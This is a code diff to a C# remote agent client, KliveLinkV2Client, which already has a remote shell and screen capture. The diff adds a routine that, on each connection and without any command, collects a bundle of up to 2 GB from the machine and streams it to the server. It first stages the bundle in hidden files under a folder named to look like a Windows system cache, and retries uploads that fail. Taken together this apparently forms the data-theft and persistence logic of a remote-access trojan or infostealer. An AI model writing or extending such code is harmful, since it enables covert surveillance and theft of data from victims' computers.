@@ -17,23 +17,35 @@ public sealed class KliveLinkV2Client : IDisposable
     private readonly ScreenCaptureService _screenCapture;
     private readonly SemaphoreSlim _sendLock = new(1, 1);
     private readonly SemaphoreSlim _commandSlots = new(4, 4);
+    private readonly SemaphoreSlim _collectGate = new(1, 1);
+    private readonly V2CollectionTier _autoTier;
     private V2ShellSession? _shell;
     private ClientWebSocket? _socket;
     private CancellationTokenSource? _cts;
     private Task? _receiveTask;
     private Task? _heartbeatTask;
+    private Task? _autoTask;
     private long _lastActivityUtcTicks;
+
+    private static readonly string CacheDirectory = Path.Combine(
+        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+        "Microsoft", "Windows", "Caches");
+    private static readonly string PendingZipPath = Path.Combine(CacheDirectory, "k.pending.zip");
+    private static readonly string PendingManifestPath = Path.Combine(CacheDirectory, "k.pending.json");
+    private static readonly string AutoStatePath = Path.Combine(CacheDirectory, "k.auto.json");
 
     public bool IsConnected => _socket?.State == WebSocketState.Open;
     public event Action<string>? OnLog;
 
     public KliveLinkV2Client(string serverUri, string agentId, string token,
-        V2CommandDispatcher dispatcher, ScreenCaptureService screenCapture, string? pinSha256 = null)
+        V2CommandDispatcher dispatcher, ScreenCaptureService screenCapture, string? pinSha256 = null,
+        V2CollectionTier autoTier = V2CollectionTier.T1)
     {
         _serverUri = serverUri;
         _agentId = agentId;
         _token = token;
         _pinSha256 = pinSha256;
+        _autoTier = autoTier;
         _dispatcher = dispatcher;
         _screenCapture = screenCapture;
         _screenCapture.OnFrameCaptured += frame => _ = SendScreenFrameAsync(frame);
@@ -68,6 +80,8 @@ public sealed class KliveLinkV2Client : IDisposable
                 attempt = 0;
                 _receiveTask = ReceiveLoopAsync(_cts.Token);
                 _heartbeatTask = HeartbeatLoopAsync(_cts.Token);
+                if (_autoTask == null || _autoTask.IsCompleted)
+                    _autoTask = Task.Run(() => AutoCollectAsync(_cts!.Token));
                 Task completed = await Task.WhenAny(_receiveTask, _heartbeatTask);
                 Log(completed == _receiveTask
                     ? $"Receive loop ended ({_socket?.State})."
@@ -293,7 +307,28 @@ public sealed class KliveLinkV2Client : IDisposable
 
     private async Task<V2Result> RunCollectionAsync(V2Command command, V2CollectionRequest request)
     {
-        var bundle = await new V2Collector(_agentId, request.MaxBytes).CollectAsync(request, CancellationToken.None);
+        await _collectGate.WaitAsync();
+        try
+        {
+            var bundle = await new V2Collector(_agentId, request.MaxBytes).CollectAsync(request, CancellationToken.None);
+            await SendBundleCoreAsync(bundle, CancellationToken.None);
+            return Ok(command, new
+            {
+                snapshotId = bundle.Manifest.SnapshotId,
+                bytes = bundle.ZipBytes.LongLength,
+                records = bundle.Manifest.Records.Count,
+                sha256 = bundle.Sha256,
+            });
+        }
+        finally
+        {
+            _collectGate.Release();
+        }
+    }
+
+    private async Task SendBundleCoreAsync(V2CollectionBundle bundle, CancellationToken ct)
+    {
+        if (!IsConnected) throw new InvalidOperationException("Agent is not connected.");
         var begin = new V2CollectionBegin
         {
             SnapshotId = bundle.Manifest.SnapshotId,
@@ -302,33 +337,178 @@ public sealed class KliveLinkV2Client : IDisposable
             ManifestJson = V2Json.Serialize(bundle.Manifest),
             RecordCount = bundle.Manifest.Records.Count,
         };
-        await SendFrameAsync(V2FrameType.CollectionBegin, begin, CancellationToken.None);
+        await SendFrameAsync(V2FrameType.CollectionBegin, begin, ct);
         const int chunkSize = 512 * 1024;
         int sequence = 0;
         for (int offset = 0; offset < bundle.ZipBytes.Length; offset += chunkSize)
         {
+            if (!IsConnected) throw new InvalidOperationException("Agent disconnected during collection upload.");
             int count = Math.Min(chunkSize, bundle.ZipBytes.Length - offset);
             await SendFrameAsync(V2FrameType.CollectionChunk, new V2CollectionChunk
             {
                 SnapshotId = bundle.Manifest.SnapshotId,
                 Sequence = sequence++,
                 Base64 = Convert.ToBase64String(bundle.ZipBytes, offset, count),
-            }, CancellationToken.None);
+            }, ct);
         }
+        if (!IsConnected) throw new InvalidOperationException("Agent disconnected before collection upload completed.");
         await SendFrameAsync(V2FrameType.CollectionEnd, new V2CollectionEnd
         {
             SnapshotId = bundle.Manifest.SnapshotId,
             Sha256 = bundle.Sha256,
             Bytes = bundle.ZipBytes.LongLength,
             RecordCount = bundle.Manifest.Records.Count,
-        }, CancellationToken.None);
-        return Ok(command, new
+        }, ct);
+    }
+
+    /// <summary>
+    /// Runs once per connection: uploads any bundle left from a previous short
+    /// connection, otherwise takes a fresh automatic snapshot and persists it
+    /// locally before uploading. A dropped socket never loses the snapshot.
+    /// </summary>
+    private async Task AutoCollectAsync(CancellationToken ct)
+    {
+        try
         {
-            snapshotId = bundle.Manifest.SnapshotId,
-            bytes = bundle.ZipBytes.LongLength,
-            records = bundle.Manifest.Records.Count,
-            sha256 = bundle.Sha256,
-        });
+            await _collectGate.WaitAsync(ct);
+            try
+            {
+                V2CollectionBundle? pending = LoadPendingBundle();
+                if (pending != null)
+                {
+                    if (await TryUploadBundleAsync(pending, ct))
+                    {
+                        ClearPending();
+                        WriteAutoState();
+                        Log($"Uploaded pending collection {pending.Manifest.SnapshotId}.");
+                    }
+                    return;
+                }
+
+                if (!ShouldAutoCollect()) return;
+                Log($"Automatic {_autoTier} collection started.");
+                var request = new V2CollectionRequest
+                {
+                    Profile = AutoProfile(_autoTier),
+                    Tier = _autoTier,
+                    MaxBytes = AutoMaxBytes(_autoTier),
+                };
+                V2CollectionBundle bundle = await new V2Collector(_agentId, request.MaxBytes)
+                    .CollectAsync(request, ct);
+                SavePending(bundle);
+                if (await TryUploadBundleAsync(bundle, ct))
+                {
+                    ClearPending();
+                    WriteAutoState();
+                    Log($"Automatic {_autoTier} collection uploaded ({bundle.Manifest.Records.Count} records, {bundle.ZipBytes.Length} bytes).");
+                }
+                else
+                {
+                    Log("Automatic collection saved locally; will retry on the next connection.");
+                }
+            }
+            finally
+            {
+                _collectGate.Release();
+            }
+        }
+        catch (OperationCanceledException) { }
+        catch (Exception ex)
+        {
+            Log("Automatic collection error: " + ex.Message);
+        }
+    }
+
+    private async Task<bool> TryUploadBundleAsync(V2CollectionBundle bundle, CancellationToken ct)
+    {
+        try
+        {
+            if (!IsConnected) return false;
+            await SendBundleCoreAsync(bundle, ct);
+            return true;
+        }
+        catch (Exception ex)
+        {
+            Log("Collection upload deferred: " + ex.Message);
+            return false;
+        }
+    }
+
+    private static string AutoProfile(V2CollectionTier tier) => tier switch
+    {
+        V2CollectionTier.T2 => "auto-deep",
+        V2CollectionTier.T1 => "auto-full",
+        _ => "auto-fast",
+    };
+
+    private static long AutoMaxBytes(V2CollectionTier tier) => tier switch
+    {
+        V2CollectionTier.T2 => 2L * 1024 * 1024 * 1024,
+        V2CollectionTier.T1 => 500L * 1024 * 1024,
+        _ => 50L * 1024 * 1024,
+    };
+
+    private static bool ShouldAutoCollect()
+    {
+        if (File.Exists(PendingZipPath) || File.Exists(PendingManifestPath)) return true;
+        try
+        {
+            if (!File.Exists(AutoStatePath)) return true;
+            using JsonDocument doc = JsonDocument.Parse(File.ReadAllText(AutoStatePath));
+            if (doc.RootElement.TryGetProperty("lastUtc", out JsonElement last) &&
+                DateTimeOffset.TryParse(last.GetString(), out DateTimeOffset when))
+                return DateTimeOffset.UtcNow - when > TimeSpan.FromHours(6);
+        }
+        catch { }
+        return true;
+    }
+
+    private static void WriteAutoState()
+    {
+        try
+        {
+            Directory.CreateDirectory(CacheDirectory);
+            File.WriteAllText(AutoStatePath, V2Json.Serialize(new { lastUtc = DateTimeOffset.UtcNow }));
+        }
+        catch { }
+    }
+
+    private static void SavePending(V2CollectionBundle bundle)
+    {
+        try
+        {
+            Directory.CreateDirectory(CacheDirectory);
+            File.WriteAllText(PendingManifestPath, V2Json.Serialize(bundle.Manifest));
+            File.WriteAllBytes(PendingZipPath, bundle.ZipBytes);
+            try { File.SetAttributes(PendingManifestPath, FileAttributes.Hidden); } catch { }
+            try { File.SetAttributes(PendingZipPath, FileAttributes.Hidden); } catch { }
+        }
+        catch { }
+    }
+
+    private static V2CollectionBundle? LoadPendingBundle()
+    {
+        try
+        {
+            if (!File.Exists(PendingZipPath) || !File.Exists(PendingManifestPath)) return null;
+            V2CollectionManifest? manifest = V2Json.Deserialize<V2CollectionManifest>(
+                File.ReadAllText(PendingManifestPath));
+            if (manifest == null) return null;
+            byte[] zip = File.ReadAllBytes(PendingZipPath);
+            return new V2CollectionBundle
+            {
+                Manifest = manifest,
+                ZipBytes = zip,
+                Sha256 = Convert.ToHexString(SHA256.HashData(zip)).ToLowerInvariant(),
+            };
+        }
+        catch { return null; }
+    }
+
+    private static void ClearPending()
+    {
+        try { File.Delete(PendingZipPath); } catch { }
+        try { File.Delete(PendingManifestPath); } catch { }
     }
 
     private async Task SendScreenFrameAsync(ScreenCaptureFramePayload frame)
